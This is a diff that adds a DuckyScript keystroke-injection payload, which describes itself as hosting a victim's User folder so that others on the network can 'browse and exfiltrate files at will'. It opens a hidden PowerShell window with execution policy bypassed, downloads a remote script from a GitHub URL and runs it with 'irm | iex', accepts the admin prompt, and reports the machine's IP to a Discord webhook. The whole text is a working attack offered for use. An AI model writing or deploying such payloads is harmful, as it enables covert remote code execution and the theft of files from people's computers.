@@ -1,0 +1,19 @@
+REM Title: beigeworm's USER folder Host.
+REM Author: @beigeworm
+REM Description: This script hosts the User directory to the machines ip address so another device on the network can browse and exfiltrate files at will.
+REM ( use ipconfig to find the local ip and type http://<LOCALIP>:5000/ in a browser )
+REM **MUST BE RUN AS ADMIN**
+REM Discord Webhook not required - It will post the machine's local IP to discord.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -w h -NoP -Ep Bypass -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/FileServer.ps1 | iex
+CTRL-SHIFT ENTER
+DELAY 3000
+ALT y
+
